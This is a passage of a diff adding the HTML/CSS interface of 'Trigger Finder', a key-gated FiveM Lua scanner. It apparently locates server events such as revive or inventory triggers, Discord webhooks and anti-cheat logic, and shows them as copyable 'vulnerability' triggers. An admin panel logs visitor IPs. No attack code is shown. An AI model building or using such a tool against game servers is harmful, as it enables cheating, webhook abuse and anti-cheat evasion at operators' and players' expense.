@@ -1,0 +1,2982 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trigger Finder — FiveM</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@300;400;500;600&family=Cairo:wght@300;400;600;700;800&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg: #16181a;
+            --surface: #1e2023;
+            --surface2: #282a2d;
+            --surface3: #34373a;
+            --border: #404449;
+            --text: #ffffff;
+            --muted: #a0a5ab;
+            --accent: #5e646d;
+            --accent2: #848b96;
+            --accent3: #d33833;
+            --radius: 12px;
+            --sans: 'Inter', -apple-system, sans-serif;
+            --mono: 'JetBrains Mono', 'Fira Code', monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        html,
+        body {
+            height: 100%;
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--sans);
+            overflow: hidden
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: linear-gradient(var(--border) 1px, transparent 1px), linear-gradient(90deg, var(--border) 1px, transparent 1px);
+            background-size: 40px 40px;
+            opacity: .4;
+            pointer-events: none;
+            z-index: 0
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(ellipse 60% 50% at 50% 0%, rgba(176, 181, 186, .08) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: 0
+        }
+        
+        .snow-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .snow {
+            width: 1px;
+            height: 1px;
+            background: white;
+            position: absolute;
+            top: -100px;
+            box-shadow: 10vw 10vh #fff, 20vw 20vh #fff, 30vw 30vh #fff, 40vw 40vh #fff, 50vw 50vh #fff, 60vw 60vh #fff, 70vw 70vh #fff, 80vw 80vh #fff, 90vw 90vh #fff, 100vw 100vh #fff,
+            5vw 15vh #fff, 15vw 25vh #fff, 25vw 35vh #fff, 35vw 45vh #fff, 45vw 55vh #fff, 55vw 65vh #fff, 65vw 75vh #fff, 75vw 85vh #fff, 85vw 95vh #fff, 95vw 50vh #fff;
+            animation: snowfall 20s linear infinite;
+            opacity: 0.7;
+            filter: blur(1px);
+        }
+
+        @keyframes snowfall {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100vh); }
+        }
+        
+        .key-gate {
+            position: fixed; inset: 0;
+            background: rgba(10, 12, 15, 0.95); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            z-index: 99999; display: flex; align-items: center; justify-content: center; transition: opacity 0.5s;
+        }
+        .key-box {
+            background: rgba(26, 26, 26, 0.6); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 16px;
+            padding: 30px; width: 350px; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.5); animation: slideUp 0.4s ease;
+        }
+        .key-input {
+            width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid var(--border);
+            border-radius: 8px; color: #fff; font-family: var(--mono); text-align: center; outline: none; transition: 0.3s;
+        }
+        .key-input:focus { border-color: var(--accent); }
+
+
+        .app {
+            position: relative;
+            z-index: 1;
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            height: 100vh
+        }
+
+        /* SIDEBAR */
+        .sidebar {
+            position: relative;
+            z-index: 40;
+            background: var(--surface);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden
+        }
+
+        .logo {
+            padding: 20px 18px 14px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 12px
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+            flex-shrink: 0
+        }
+
+        .logo-text {
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: .4px
+        }
+
+        .logo-sub {
+            font-size: 11px;
+            color: var(--muted);
+            font-family: var(--mono);
+            margin-top: 2px
+        }
+
+        .upload-section {
+            margin: 14px 14px 8px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px
+        }
+
+        .drop-zone {
+            padding: 16px 12px;
+            border: 1.5px dashed var(--border);
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: .2s;
+            background: rgba(255, 255, 255, .02)
+        }
+
+        .drop-zone.drag-over {
+            border-color: var(--accent);
+            background: rgba(0, 212, 255, .05)
+        }
+
+        .drop-zone:hover {
+            border-color: var(--muted)
+        }
+
+        .drop-zone input {
+            display: none
+        }
+
+        .drop-icon {
+            font-size: 22px;
+            margin-bottom: 5px
+        }
+
+        .drop-text {
+            font-size: 12px;
+            color: var(--muted);
+            line-height: 1.5
+        }
+
+        .drop-text strong {
+            color: var(--accent)
+        }
+
+        .folder-btn {
+            width: 100%;
+            padding: 9px 12px;
+            font-size: 12px;
+            font-weight: 500;
+            background: rgba(0, 212, 255, .08);
+            border: 1px solid rgba(0, 212, 255, .3);
+            border-radius: 8px;
+            color: var(--accent);
+            cursor: pointer;
+            font-family: var(--sans);
+            transition: .15s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 7px
+        }
+
+        .folder-btn:hover {
+            background: rgba(0, 212, 255, .15);
+            border-color: var(--accent)
+        }
+
+        .file-stats {
+            margin: 0 14px 8px;
+            gap: 8px;
+            display: none
+        }
+
+        .file-stats.visible {
+            display: flex
+        }
+
+        .stat {
+            flex: 1;
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 8px;
+            text-align: center
+        }
+
+        .stat-n {
+            font-size: 18px;
+            font-weight: 700;
+            font-family: var(--mono);
+            color: var(--accent)
+        }
+
+        .stat-l {
+            font-size: 10px;
+            color: var(--muted);
+            margin-top: 1px
+        }
+
+        .tabs {
+            position: relative;
+            z-index: 50;
+            display: flex;
+            gap: 2px;
+            padding: 0 14px 10px
+        }
+
+        .tab {
+            flex: 1;
+            padding: 7px 4px;
+            font-size: 11px;
+            text-align: center;
+            cursor: pointer;
+            border-radius: 6px;
+            color: var(--muted);
+            transition: .15s;
+            font-family: var(--sans);
+            border: none;
+            background: transparent
+        }
+
+        .tab:hover {
+            color: var(--text)
+        }
+
+        .tab.active {
+            background: var(--surface2);
+            color: var(--accent);
+            border: 1px solid var(--border)
+        }
+
+        .tab-content {
+            display: none;
+            flex-direction: column;
+            gap: 6px;
+            padding: 0 14px 12px;
+            flex: 1;
+            overflow-y: auto
+        }
+
+        .tab-content.active {
+            display: flex
+        }
+
+        .tab-content::-webkit-scrollbar {
+            width: 3px
+        }
+
+        .tab-content::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 2px
+        }
+
+        .section-label {
+            font-size: 10px;
+            color: var(--muted);
+            font-weight: 600;
+            letter-spacing: .6px;
+            padding-top: 2px
+        }
+
+        .btn {
+            padding: 8px 12px;
+            font-size: 12px;
+            background: transparent;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            cursor: pointer;
+            text-align: left;
+            transition: .15s;
+            font-family: var(--sans);
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .btn:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: rgba(0, 212, 255, .04)
+        }
+
+        .btn-emoji {
+            font-size: 13px;
+            flex-shrink: 0
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, rgba(0, 212, 255, .12), rgba(123, 97, 255, .08));
+            border-color: rgba(0, 212, 255, .4);
+            color: var(--accent);
+            justify-content: center;
+            font-weight: 500
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, rgba(0, 212, 255, .22), rgba(123, 97, 255, .16));
+            border-color: var(--accent)
+        }
+
+        textarea.custom-input {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: var(--text);
+            font-family: var(--mono);
+            font-size: 11px;
+            padding: 10px;
+            resize: vertical;
+            min-height: 90px;
+            width: 100%;
+            outline: none
+        }
+
+        textarea.custom-input:focus {
+            border-color: var(--accent)
+        }
+
+        textarea.custom-input::placeholder {
+            color: var(--muted)
+        }
+
+        .credits-box {
+            font-size: 12px;
+            color: var(--muted);
+            line-height: 2.2
+        }
+
+        .credits-box strong {
+            color: var(--text)
+        }
+
+        /* MAIN */
+        .main {
+            display: flex;
+            flex-direction: column;
+            overflow: hidden
+        }
+
+        .topbar {
+            padding: 14px 22px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(17, 20, 24, .85);
+            backdrop-filter: blur(8px)
+        }
+
+        .topbar-title {
+            font-size: 13px;
+            font-weight: 600;
+            font-family: var(--mono);
+            color: var(--accent);
+            letter-spacing: .3px
+        }
+
+        .status-pill {
+            font-size: 11px;
+            font-family: var(--mono);
+            padding: 4px 12px;
+            border-radius: 20px;
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            color: var(--muted)
+        }
+
+        .status-pill.active {
+            border-color: var(--green);
+            color: var(--green)
+        }
+
+        .status-pill.searching {
+            border-color: var(--accent);
+            color: var(--accent)
+        }
+
+        .toolbar {
+            padding: 9px 22px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--surface)
+        }
+
+        .result-count {
+            font-size: 12px;
+            color: var(--muted);
+            flex: 1;
+            font-family: var(--mono)
+        }
+
+        .result-count b {
+            color: var(--accent)
+        }
+
+        .export-btn {
+            padding: 6px 14px;
+            font-size: 11px;
+            background: transparent;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--muted);
+            cursor: pointer;
+            transition: .15s;
+            font-family: var(--sans)
+        }
+
+        .export-btn:hover {
+            border-color: var(--accent2);
+            color: var(--accent2)
+        }
+
+        .results-area {
+            flex: 1;
+            overflow-y: auto;
+            padding: 18px 22px
+        }
+
+        .results-area::-webkit-scrollbar {
+            width: 4px
+        }
+
+        .results-area::-webkit-scrollbar-thumb {
+            background: var(--border);
+            border-radius: 2px
+        }
+
+        .empty-state {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            opacity: .4
+        }
+
+        .empty-icon {
+            font-size: 44px
+        }
+
+        .empty-text {
+            font-size: 13px;
+            color: var(--muted);
+            text-align: center;
+            line-height: 1.7
+        }
+
+        .result-group {
+            margin-bottom: 20px;
+            animation: fadeIn .18s ease;
+            content-visibility: auto;
+            contain-intrinsic-size: 100px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(4px)
+            }
+
+            to {
+                opacity: 1;
+                transform: none
+            }
+        }
+
+        .result-group-header {
+            font-size: 11px;
+            font-family: var(--mono);
+            color: var(--muted);
+            padding: 6px 12px;
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 8px 8px 0 0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border-bottom: none
+        }
+
+        .rgh-badge {
+            margin-left: auto;
+            background: rgba(0, 212, 255, .12);
+            color: var(--accent);
+            font-size: 10px;
+            padding: 1px 7px;
+            border-radius: 10px
+        }
+
+        .result-items {
+            border: 1px solid var(--border);
+            border-radius: 0 0 8px 8px;
+            overflow: hidden
+        }
+
+        .result-item {
+            padding: 9px 12px;
+            border-bottom: 1px solid var(--border);
+            font-family: var(--mono);
+            font-size: 12px;
+            line-height: 1.5;
+            display: flex;
+            gap: 14px;
+            align-items: baseline;
+            transition: .1s
+        }
+
+        .result-item:last-child {
+            border-bottom: none
+        }
+
+        .result-item:hover {
+            background: var(--surface2)
+        }
+
+        .line-num {
+            color: var(--muted);
+            min-width: 32px;
+            flex-shrink: 0;
+            font-size: 10px
+        }
+
+        .line-code {
+            color: var(--text);
+            word-break: break-all
+        }
+
+        .hl {
+            color: #0a0c0f;
+            background: var(--accent);
+            border-radius: 3px;
+            padding: 0 3px;
+            font-weight: 700
+        }
+
+        .hl-dyn {
+            background: var(--accent2)
+        }
+
+        .hl-web {
+            background: var(--accent3)
+        }
+
+        .hl-item {
+            background: var(--green)
+        }
+
+        /* ITEM CARDS */
+        .item-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 12px;
+            padding: 10px 0
+        }
+
+        .item-card {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: .2s;
+            position: relative;
+            overflow: hidden;
+            content-visibility: auto;
+            contain-intrinsic-size: 75px;
+        }
+
+        .item-card:hover {
+            border-color: var(--accent);
+            transform: translateY(-2px);
+            background: rgba(255, 255, 255, .03)
+        }
+
+        .item-img-container {
+            width: 48px;
+            height: 48px;
+            background: rgba(0, 0, 0, .3);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--border);
+            flex-shrink: 0;
+            overflow: hidden
+        }
+
+        .item-img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain
+        }
+
+        .item-info {
+            flex: 1;
+            min-width: 0
+        }
+
+        .item-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 2px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis
+        }
+
+        .item-code {
+            font-size: 10px;
+            font-family: var(--mono);
+            color: var(--accent);
+            background: rgba(0, 212, 255, .1);
+            padding: 1px 4px;
+            border-radius: 4px;
+            display: inline-block
+        }
+
+        .item-file {
+            position: absolute;
+            bottom: 4px;
+            right: 8px;
+            font-size: 8px;
+            color: var(--muted);
+            font-family: var(--mono)
+        }
+
+        /* WEBHOOK PAGE STYLING */
+        .webhook-page {
+            max-width: 600px;
+            margin: 20px auto;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            animation: slideUp 0.3s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .webhook-input {
+            background: var(--surface2) !important;
+            border: 1px solid var(--border) !important;
+            border-radius: 8px !important;
+            color: var(--text) !important;
+            font-family: var(--mono) !important;
+            padding: 10px 15px !important;
+            width: 100% !important;
+            margin-bottom: 12px !important;
+            outline: none !important;
+        }
+
+        .webhook-input:focus {
+            border-color: var(--accent) !important;
+            box-shadow: 0 0 10px rgba(0, 212, 255, 0.1) !important;
+        }
+
+        .webhook-label {
+            font-size: 10px;
+            color: var(--muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+            display: block;
+            font-weight: 600;
+        }
+
+        .search-box {
+            position: relative;
+            margin-right: 15px
+        }
+
+        .search-input {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-size: 11px;
+            padding: 6px 10px 6px 30px;
+            outline: none;
+            width: 180px;
+            transition: .15s;
+            font-family: var(--sans);
+        }
+
+        .search-input:focus {
+            border-color: var(--accent);
+            width: 220px
+        }
+
+        .search-icon {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 12px;
+            opacity: .5
+        }
+
+        /* VULNERABILITY CARDS */
+        .vuln-dashboard {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px;
+            margin-bottom: 20px;
+            animation: fadeIn 0.2s ease;
+        }
+        .vuln-stat-card {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 14px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .vuln-stat-card::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: var(--stat-color);
+        }
+        .vuln-stat-val {
+            font-size: 24px;
+            font-weight: 800;
+            font-family: var(--mono);
+            color: var(--stat-color);
+        }
+        .vuln-stat-lbl {
+            font-size: 11px;
+            color: var(--muted);
+            margin-top: 4px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        .vuln-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            padding: 10px 0;
+        }
+        .vuln-card {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            position: relative;
+            transition: all 0.2s ease;
+            border-left: 4px solid var(--risk-color);
+        }
+        .vuln-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+            background: var(--surface3);
+        }
+        .vuln-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+        .vuln-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text);
+            font-family: var(--mono);
+            word-break: break-all;
+        }
+        .vuln-badge {
+            font-size: 10px;
+            font-weight: 700;
+            padding: 3px 8px;
+            border-radius: 20px;
+            background: rgba(255,255,255,0.06);
+            color: var(--risk-color);
+            border: 1px solid var(--risk-color);
+            font-family: var(--sans);
+        }
+        .vuln-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-size: 11px;
+            color: var(--muted);
+            font-family: var(--mono);
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            padding-bottom: 8px;
+        }
+        .vuln-meta-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .vuln-desc {
+            font-size: 12px;
+            color: #d1d8e0;
+            line-height: 1.6;
+        }
+        .vuln-desc strong {
+            color: var(--risk-color);
+        }
+        .vuln-trigger-box {
+            background: #090b0e;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 10px;
+            font-family: var(--mono);
+            font-size: 11px;
+            color: #00ffaa;
+            position: relative;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            padding-right: 90px;
+        }
+        .vuln-copy-btn {
+            position: absolute;
+            right: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 4px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 10px;
+            font-family: var(--sans);
+            transition: 0.15s;
+        }
+        .vuln-copy-btn:hover {
+            background: var(--accent);
+            color: var(--bg);
+            border-color: var(--accent);
+        }
+    </style>
+    <link rel="icon" href="https://media.discordapp.net/attachments/1508985883066634396/1512655265189855362/sqn0xmk.webp">
+</head>
+
+<body>
+    <div id="keyGate" class="key-gate">
+        <div class="key-box">
+            <h2 style="margin-bottom:10px;color:#fff;font-family:var(--sans);">🔒 Access Key Required</h2>
+            <p style="color:var(--muted);font-size:12px;margin-bottom:20px;">Please enter your premium access key to use Trigger Finder.</p>
+            <input type="password" id="accessKeyInput" class="key-input" placeholder="Enter Key...">
+            <button id="verifyKeyBtn" class="btn" style="width:100%;justify-content:center;margin-top:10px;background:var(--accent2);color:#fff;border:none;">Verify Access</button>
+            <p id="keyError" style="color:var(--accent3);font-size:11px;margin-top:10px;display:none;">❌ Invalid Key. Try again.</p>
+        </div>
+    </div>
+    <div class="snow-wrapper"><div class="snow"></div></div>
+    
+    <!-- ADMIN PANEL MODAL -->
+    <div id="adminModal" class="key-gate" style="display:none; z-index:999999;">
+        <div class="key-box" style="width:700px; max-width:90%; height:80vh; display:flex; flex-direction:column; padding:0; overflow:hidden;">
+            <!-- Login State -->
+            <div id="adminLoginState" style="padding:40px;">
+                <h2 style="color:#fff;font-family:var(--sans);margin-bottom:20px;">🛡️ Admin Authentication</h2>
+                <input type="text" id="adminUser" class="key-input" placeholder="Username" style="margin-bottom:10px;">
+                <input type="password" id="adminPass" class="key-input" placeholder="Password" style="margin-bottom:10px;">
+                <button class="btn" onclick="adminLogin()" style="width:100%;justify-content:center;background:var(--accent2);color:#fff;border:none;">Login</button>
+                <p id="adminErr" style="color:var(--accent3);font-size:11px;margin-top:10px;display:none;">❌ Invalid Credentials</p>
+            </div>
+            
+            <!-- Dashboard State -->
+            <div id="adminDashboardState" style="display:none; flex:1; display:flex; flex-direction:column; text-align:left;">
+                <div style="padding:15px 20px; background:rgba(0,0,0,0.4); border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center;">
+                    <h3 style="color:#fff; margin:0;">Admin Dashboard</h3>
+                    <div style="display:flex; gap:10px;">
+                        <button class="btn" style="background:var(--danger); color:#fff; border:none; padding:5px 10px;" onclick="logoutAdmin()">🚪 Logout</button>
+                        <button class="btn" onclick="document.getElementById('adminModal').style.display='none'" style="padding:5px 10px;">Close (F2)</button>
+                    </div>
+                </div>
+                
+                <div style="display:flex; flex:1; overflow:hidden;">
+                    <!-- Sidebar -->
+                    <div style="width:200px; border-right:1px solid var(--border); padding:15px; display:flex; flex-direction:column; gap:10px;">
+                        <button class="btn active" onclick="switchAdminTab('keys')">🔑 Manage Keys</button>
+                        <button class="btn" onclick="switchAdminTab('logs')">📡 Visitor Logs</button>
+                    <button class="btn" onclick="switchAdminTab('admins')">👥 Manage Admins</button>
+                    </div>
+                    
+                    <!-- Content -->
+                    <div style="flex:1; padding:20px; overflow-y:auto; position:relative;">
+                        
+                        <!-- Keys Tab -->
+                        <div id="adminTabKeys">
+                            <div style="display:flex; gap:10px; margin-bottom:20px;">
+                                <select id="keyDuration" class="custom-input" style="min-height:auto; padding:8px; flex:1;">
+                                    <option value="1h">1 Hour</option>
+                                    <option value="1d">1 Day</option>
+                                    <option value="30d" selected>30 Days</option>
+                                    <option value="60d">60 Days</option>
+                                    <option value="lifetime">Lifetime</option>
+                                </select>
+                                <button class="btn" onclick="generateKey()" style="background:var(--accent2);color:#fff;">+ Generate Key</button>
+                            </div>
+                            
+                            <table style="width:100%; border-collapse:collapse; color:var(--muted); font-size:12px;" id="keysTable">
+                                <thead>
+                                    <tr style="border-bottom:1px solid var(--border); color:#fff; text-align:left;">
+                                        <th style="padding:8px;">Key</th>
+                                        <th style="padding:8px;">Duration</th>
+                                        <th style="padding:8px;">Bound IP</th>
+                                        <th style="padding:8px; text-align:right;">Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody></tbody>
+                            </table>
+                        </div>
+                        
+                        
+                        <!-- Admins Tab -->
+                        <div id="adminTabAdmins" style="display:none;">
+                            <div style="display:flex; gap:10px; margin-bottom:20px;">
+                                <input type="text" id="newAdminUser" class="form-input" style="flex:1;" placeholder="New Username">
+                                <input type="text" id="newAdminPass" class="form-input" style="flex:1;" placeholder="New Password">
+                                <button class="btn" style="background:var(--success); color:#fff;" onclick="addAdminUser()">+ Add Admin</button>
+                            </div>
+                            
+                            <table style="width:100%; border-collapse:collapse; color:var(--text); font-size:12px;" id="adminsTable">
+                                <thead>
+                                    <tr style="border-bottom:1px solid rgba(255,255,255,0.1); color:var(--muted); text-align:left;">
+                                        <th style="padding:10px; font-weight:normal;">Username</th>
+                                        <th style="padding:10px; font-weight:normal;">Password</th>
+                                        <th style="padding:10px; font-weight:normal; text-align:right;">Actions</th>
+                                    </tr>
+                                </thead>
+                                <tbody></tbody>
+                            </table>
+                        </div>
+                        
+<!-- Logs Tab -->
+                        <div id="adminTabLogs" style="display:none;">
+                            <table style="width:100%; border-collapse:collapse; color:var(--muted); font-size:12px;" id="logsTable">
+                                <thead>
+                                    <tr style="border-bottom:1px solid var(--border); color:#fff; text-align:left;">
+                                        <th style="padding:8px;">Date</th>
+                                        <th style="padding:8px;">IP Address</th>
+                                        <th style="padding:8px;">Action</th>
+                                    </tr>
+                                </thead>
+                                <tbody></tbody>
+                            </table>
+                        </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="app">
+
+        <div class="sidebar">
+            <div class="logo">
+                <div class="logo-icon" style="background:transparent; box-shadow:none; padding:0;">
+                    <img src="https://media.discordapp.net/attachments/1508985883066634396/1512655265189855362/sqn0xmk.webp?ex=6a24e17e&is=6a238ffe&hm=b24f15565d479650633454c78ae1a9b930252ee9741f765c8a62a5e1348be77a&=&format=webp" style="width: 36px; height: 36px; border-radius: 8px; object-fit: cover; display: block;" alt="Logo">
+                </div>
+                <div>
+                    <div class="logo-text">Trigger Finder</div>
+                    <div class="logo-sub">FiveM / Lua Scanner</div>
+                </div>
+            </div>
+
+            <div class="upload-section">
+                <div class="drop-zone" id="dropZone" onclick="document.getElementById('fileInput').click()">
+                    <input type="file" id="fileInput" multiple accept=".lua" onchange="handleFiles(this.files)">
+                    <div class="drop-icon">📄</div>
+                    <div class="drop-text">Drop <strong>.lua files</strong> here or click to pick files</div>
+                </div>
+                <button class="folder-btn" onclick="document.getElementById('folderInput').click()">
+                    <input type="file" id="folderInput" webkitdirectory multiple style="display:none"
+                        onchange="handleFiles(this.files)">
+                    📁&nbsp; Select Folder
+                </button>
+            </div>
+
+            <div class="file-stats" id="fileStats">
+                <div class="stat">
+                    <div class="stat-n" id="fCount">0</div>
+                    <div class="stat-l">Files</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-n" id="lCount">0</div>
+                    <div class="stat-l">Lines</div>
+                </div>
+            </div>
+
+            <div class="tab-content active" id="tab-finder">
+                <div class="section-label">COMMON EVENTS</div>
+                <button class="btn" onclick="runSearch(['TriggerServerEvent'],'TriggerServerEvent','accent')"><span
+                        class="btn-emoji">🖥️</span>TriggerServerEvent</button>
+                <button class="btn" onclick="runSearch(['TriggerEvent'],'TriggerEvent','accent')"><span
+                        class="btn-emoji">📡</span>TriggerEvent</button>
+                <button class="btn"
+                    onclick="runSearch(['TriggerServerEvent','TriggerEvent'],'Revive Events','accent',['revive'])"><span
+                        class="btn-emoji">❤️</span>Revive Events</button>
+                <button class="btn"
+                    onclick="runSearch(['TriggerServerEvent','TriggerEvent'],'Inventory Events','accent',['inventory'])"><span
+                        class="btn-emoji">🎒</span>Inventory Events</button>
+                <div class="section-label" style="margin-top:4px">ADVANCED</div>
+                <button class="btn" onclick="scanAntiCheat()"><span class="btn-emoji">🛡️</span>Anti-Cheat Analyzer</button>
+                <button class="btn" onclick="runDynamic()"><span class="btn-emoji">⚡</span>Dynamic Triggers</button>
+                <button class="btn" onclick="runWebhooks()"><span class="btn-emoji">🔗</span>Discord Webhooks</button>
+                <button class="btn" onclick="runItems()"><span class="btn-emoji">📦</span>Server Items</button>
+                <button class="btn" onclick="runVehicles()"><span class="btn-emoji">🚗</span>Server Vehicles</button>
+                <button class="btn" onclick="runJobs()"><span class="btn-emoji">💼</span>Server Jobs</button>
+                <button class="btn" onclick="switchTab('webhooks')"><span class="btn-emoji">🔗</span>Webhooks
+                    Manager</button>
+            </div>
+
+            <div class="tab-content" id="tab-custom">
+                <div class="section-label">CUSTOM PATTERNS</div>
+                <div style="font-size:11px;color:var(--muted)">One pattern per line</div>
+                <textarea class="custom-input" id="customPat"
+                    placeholder="TriggerServerEvent&#10;myEvent:server&#10;esx_banking:..."></textarea>
+                <button class="btn btn-primary" onclick="runCustom()">Run Search</button>
+            </div>
+
+            <div class="tab-content" id="tab-credits">
+                <div class="credits-box">
+                    <div style="font-size:13px;font-weight:600;color:var(--text);margin-bottom:4px">Trigger Finder</div>
+                    <div>Made by: <strong>7rz</strong></div>
+                    <div>Converted : <strong>NULLNEXT</strong></div>
+                    <a href="https://discord.gg/rra" target="_blank" style="display:flex; align-items:center; gap:8px; margin-top:15px; padding:10px; background:#5865F2; color:#fff; text-decoration:none; border-radius:6px; font-weight:600; font-size:12px; justify-content:center; transition:0.2s; border:1px solid rgba(255,255,255,0.1); box-shadow:0 4px 15px rgba(88,101,242,0.3);" onmouseover="this.style.transform='translateY(-2px)'" onmouseout="this.style.transform='none'">
+                        <svg width="18" height="18" viewBox="0 0 127.14 96.36" fill="#fff"><path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a67.55,67.55,0,0,1-10.87,5.19,77.13,77.13,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.31,60,73.31,53s5-12.74,11.43-12.74S96.2,46,96.12,53,91.08,65.69,84.69,65.69Z"/></svg>
+                        Join Discord
+                    </a>
+                </div>
+            </div>
+
+            <div class="tabs">
+                <button class="tab active" onclick="switchTab('finder',this)">Search</button>
+                <button class="tab" onclick="switchTab('custom',this)">Custom</button>
+                <button class="tab" onclick="switchTab('credits',this)">About</button>
+            </div>
+        </div>
+
+        <div class="main">
+            <div class="topbar">
+                <div class="topbar-title">// OUTPUT CONSOLE</div>
+                <div id="webhook-header" style="display:none; align-items:center; gap:10px;">
+                    <div class="status-pill active" id="webhook-stats-status">READY</div>
+                </div>
+                <div class="status-pill" id="statusPill">Ready</div>
+            </div>
+            <div class="toolbar">
+                <div class="result-count" id="resultCount">Waiting for files...</div>
